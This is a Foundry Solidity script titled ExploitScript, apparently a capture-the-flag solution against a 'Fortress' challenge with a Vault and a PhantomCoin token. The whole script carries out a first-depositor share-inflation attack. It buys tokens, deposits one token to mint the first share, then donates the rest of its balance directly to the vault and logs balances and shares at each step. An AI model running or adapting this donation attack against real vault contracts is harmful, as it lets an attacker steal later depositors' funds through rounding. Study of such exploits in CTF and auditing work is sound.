// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Script.sol";
import "../src/Setup.sol";
import "../src/Fortress.sol";

contract ExploitScript is Script {
    Setup setup;
    Fortress fortress;
    Vault vault;
    PhantomCoin token;

    function setUp() public {
        setup = Setup(payable(0x0));
        fortress = Fortress(setup.challenge());
        vault = Vault(fortress.vault());
        token = PhantomCoin(fortress.token());
    }

    function run() external {
        vm.startBroadcast();

        token.buyTokens{value: 1 ether}();

        uint256 bal = token.balanceOf(msg.sender);
        console.log("User token balance after buy:", bal);

        token.approve(address(vault), 1);
        vault.deposit(1);

        console.log("User token balance after deposit:", token.balanceOf(msg.sender));
        console.log("Vault token balance:", token.balanceOf(address(vault)));
        console.log("Total shares:", vault.totalShares());

        uint256 leftover = token.balanceOf(msg.sender);
        token.transfer(address(vault), leftover);

        console.log("User token balance after transfer:", token.balanceOf(msg.sender));
        console.log("Vault token balance final:", token.balanceOf(address(vault)));
        console.log("Total shares final:", vault.totalShares());

        vm.stopBroadcast();
    }
}
